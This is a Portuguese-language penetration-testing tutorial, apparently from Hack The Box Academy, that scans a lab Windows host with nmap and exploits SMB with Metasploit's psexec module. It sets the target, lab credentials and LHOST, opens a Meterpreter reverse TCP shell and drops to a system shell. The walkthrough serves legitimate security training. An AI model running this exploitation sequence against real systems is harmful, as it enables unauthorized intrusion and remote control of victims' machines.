[Metasploit](https://www.metasploit.com/) é uma estrutura de ataque automatizada desenvolvida por `Rapid-7`. Ele agiliza o processo de exploração de vulnerabilidades através do uso de módulos pré-criados que contêm opções fáceis de usar para explorar vulnerabilidades e fornecer cargas úteis para obter um shell em um sistema vulnerável. Isso pode facilitar a exploração de um sistema vulnerável, de modo que alguns fornecedores de treinamento em segurança cibernética limitam quantas vezes ele pode ser usado em exames de laboratório. Aqui no Hack The Box, incentivamos a experiência com ferramentas em nossos ambientes de laboratório até que você tenha um sólido entendimento fundamental. A maioria das organizações não nos limita a quais ferramentas podemos ou não usar em um compromisso. No entanto, eles esperam que saibamos o que estamos fazendo. Portanto, é nossa responsabilidade buscar um entendimento à medida que aprendemos. Não entender os efeitos das ferramentas que usamos pode ser destrutivo em um teste ou auditoria de penetração ao vivo. Essa é uma das principais razões pelas quais devemos buscar consistentemente uma compreensão mais profunda das ferramentas, técnicas, metodologias e práticas que aprendemos.

Nesta seção, interageremos com o `community edition` de Metasploit no Pwnbox. Usaremos `modules` pré-construído e criar cargas úteis com `MSFVenom`. É importante observar que muitas empresas de segurança cibernética estabelecidas utilizam a edição paga do Metasploit chamada `Metasploit Pro` para realizar testes de penetração, auditorias de segurança e até campanhas de engenharia social. Se você quiser explorar as diferenças entre a edição da comunidade e o Metasploit Pro, pode conferir este [gráfico de comparação](https://www.rapid7.com/products/metasploit/download/editions/).

## Praticando com Metasploit

Poderíamos gastar o restante deste módulo cobrindo tudo sobre o Metasploit, mas vamos apenas trabalhar com o básico no contexto de shells e cargas úteis.

Vamos começar a trabalhar com o Metasploit lançando o console de estrutura do Metasploit como root (`sudo msfconsole`)

```shell-session
casluxd@htb[/htb]$ sudo msfconsole 
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

msf6 > 
```

Podemos ver que há arte criativa do ASCII apresentada como a bandeira no lançamento e alguns números de interesse particular.

- 2131 exploits
- 592 payloads

Esses números podem mudar à medida que os mantenedores adicionam e removem código ou se você importar um módulo para uso no Metasploit. Vamos nos familiarizar com as cargas úteis do Metasploit usando um clássico `exploit module` que pode ser usado para comprometer um sistema Windows. Lembre-se de que o Metasploit pode ser usado para mais do que apenas exploração. Também podemos usar módulos diferentes para digitalizar e enumerar destinos.

Nesse caso, usaremos os resultados da enumeração de um scanning `nmap` para escolher um módulo Metasploit para usar.

#### Varredura NMAP

```shell-session
casluxd@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```

Na saída, vemos várias portas padrão que normalmente são abertas em um sistema Windows por padrão. Lembre-se de que o scanning e a enumeração são uma excelente maneira de saber qual SO ( Windows ou Linux ) nosso destino está sendo executado para encontrar um módulo apropriado para ser executado com o Metasploit. Vamos com `SMB` ( ouvindo `445`) como o potencial vetor de ataque.

Depois de obter essas informações, podemos usar a funcionalidade de pesquisa do Metasploit para descobrir módulos associados ao SMB. No `msfconsole`, podemos emitir o comando `search smb` para obter uma lista de módulos associados às vulnerabilidades SMB:

#### Pesquisando no Metasploit

```shell-session
msf6 > search smb

Matching Modules
================

#    Name                                                          Disclosure Date    Rank   Check  Description
  -       ----                                                     ---------------    ----   -----  ---------- 
 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution

```

Veremos uma longa lista de `Matching Modules` associado à nossa pesquisa. Observe o formato em que cada módulo está. Cada módulo possui um número listado na extrema esquerda da tabela para facilitar a seleção do módulo, um `Name`, `Disclosure Date`, `Rank`, `Check` e `Description`.

O número à esquerda de cada módulo em potencial é um número relativo baseado na sua pesquisa que pode mudar à medida que os módulos são adicionados ao Metasploit. Não espere que esse número corresponda sempre que você executar a pesquisa ou tentar usar o módulo.

Vejamos um módulo, em particular, para entendê-lo no contexto de cargas úteis.

`56 exploit/windows/smb/psexec`

|Saída|Significado|
|---|---|
|`56`|O número atribuído ao módulo na tabela no contexto da pesquisa. Esse número facilita a seleção. Podemos usar o comando `use 56` para selecionar o módulo.|
|`exploit/`|Isso define o tipo de módulo. Nesse caso, este é um módulo de exploração. Muitos módulos de exploração em MSF incluem a carga útil que tenta estabelecer uma sessão de shell.|
|`windows/`|Isso define a plataforma que estamos segmentando. Nesse caso, sabemos que o destino é o Windows, portanto a exploração e a carga útil serão para o Windows.|
|`smb/`|Isso define o serviço para o qual a carga útil no módulo é gravada.|
|`psexec`|Isso define a ferramenta que será carregada no sistema de destino se estiver vulnerável.|

Depois de selecionar o módulo, notamos uma alteração no prompt que nos permite configurar o módulo com base em parâmetros específicos ao nosso ambiente.

#### Seleção de opção

```shell-session
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > 
```

Observe como `exploit` está fora dos parênteses. Isso pode ser interpretado como o tipo de módulo MSF sendo uma exploração e a exploração e carga útil específicas são gravadas para o Windows. O vetor de ataque é `SMB`, e a carga útil do Meterpreter será entregue usando [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). Vamos aprender mais sobre o uso dessa exploração e a entrega da carga útil usando o `options` comando.

#### Examinando as opções de uma exploração

```shell-session
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo
                                                    lder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Essa é uma área em que o Metasploit brilha em termos de facilidade de uso. Na saída das opções do módulo, vemos várias opções e configurações com uma descrição do significado de cada configuração. Não vamos usar `SERVICE_DESCRIPTION`, `SERVICE_DISPLAY_NAME` e `SERVICE_NAME` nesta seção. Observe como essa exploração específica usará uma conexão de shell TCP reversa utilizando `Meterpreter`. Um shell Meterpreter nos oferece muito mais funcionalidade do que um shell reverso TCP bruto, conforme estabelecido nas seções anteriores deste módulo. É a carga útil padrão usada no Metasploit.

Queremos usar o comando `set` para configurar as seguintes configurações como tal:

#### Definindo opções

```shell-session

msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.142.172
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

Essas configurações garantirão que nossa carga útil seja entregue ao alvo adequado (`RHOSTS`), carregado no compartilhamento administrativo padrão (`ADMIN$`) utilizando credenciais (`SMBPass` & `SMBUser`), inicie uma conexão de shell reverso com nossa máquina host local (`LHOST`).

Essas configurações serão específicas para o endereço IP na sua caixa de ataque e na caixa de destino. Assim como com as credenciais, você pode se reunir em um compromisso. Podemos definir o endereço IP do túnel VPN LHOST ( ou o ID da interface do túnel da VPN.

#### Exploit

```shell-session

msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```

Depois de emitirmos o comando `exploit`, a exploração é executada e há uma tentativa de entregar a carga útil no destino utilizando a carga útil do Meterpreter. O Metasploit relata cada etapa deste processo, como visto na saída. Sabemos que isso foi bem sucedido porque um `stage` foi enviado com sucesso, que estabeleceu uma sessão de shell do Meterpreter (`meterpreter >`) e uma sessão de shell no nível do sistema. Lembre-se de que o Meterpreter é uma carga útil que usa injeção de DLL na memória para estabelecer furtivamente um canal de comunicação entre uma caixa de ataque e um alvo. As credenciais apropriadas e o vetor de ataque podem nos dar a capacidade de carregar e baixar arquivos, executar comandos do sistema, executar um keylogger, criar / iniciar / parar serviços, gerenciar processos e muito mais.

Nesse caso, conforme detalhado neste [Rapid 7 Blog post](https://www.rapid7.com/blog/post/2013/03/09/psexec-demystified/): "a exploração implanta um executável de serviço para o compartilhamento Admin $ e usa DCE / RPC para ligar para o gerente de controle de serviço para iniciar o serviço que enviamos para Admin $. Quando o serviço é iniciado, ele inicia um novo processo rundll32.exe, aloca memória executável dentro desse processo e copia o código de shell nele. Em seguida, chama o endereço inicial desse local de memória como se fosse um ponteiro de função, executando o código de shell armazenado."

Como outros intérpretes de linguagem de comando ( Bash, PowerShell, ksh, etc ... ), as sessões de shell do Meterpreter nos permitem emitir um conjunto de comandos que podemos usar para interagir com o sistema de destino. Nós podemos usar o `?` para ver uma lista de comandos que podemos usar. Notamos limitações com o shell Meterpreter, por isso é bom tentar usar o `shell` comando para soltar em um shell no nível do sistema se precisarmos trabalhar com o conjunto completo de comandos do sistema nativos do nosso destino.

#### Shell interativo

```shell-session
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```
